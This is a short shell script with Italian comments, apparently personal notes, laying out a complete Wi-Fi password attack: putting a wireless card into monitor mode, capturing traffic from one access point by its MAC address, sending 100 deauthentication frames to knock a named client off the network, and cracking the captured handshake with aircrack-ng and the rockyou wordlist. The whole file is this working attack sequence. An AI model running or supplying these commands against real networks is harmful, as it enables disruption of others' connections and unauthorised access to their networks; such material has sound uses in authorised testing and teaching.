```sh
#Verifico che la scheda sia collegata
lsusb 

#Verifico che sia attiva come scheda di rete
iwconfig
#Oppure iw dev

#Attivo monitor mode (e verifico la corretta attivazione)
sudo iw dev wlan0 set monitor none
iwconfig

#Faccio ricognizione
sudo airodump-ng wlan0
#Restringo al canale 6
sudo airodump-ng wlan0 --channel 6
#Restringo all'AP che mi serve e salvo su file di testo
sudo airodump-ng wlan0 --channel 6 --bssid 94:83:C4:04:4E:00 -w out

#Attacco deauth (in altra sessione)
sudo aireplay-ng -0 100 -a 94:83:C4:04:4E:00 -c 0:D9:C7:B0:8A:80 wlan0

#crack
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 94:83:C4:04:4E:00 dump4-01.cap
```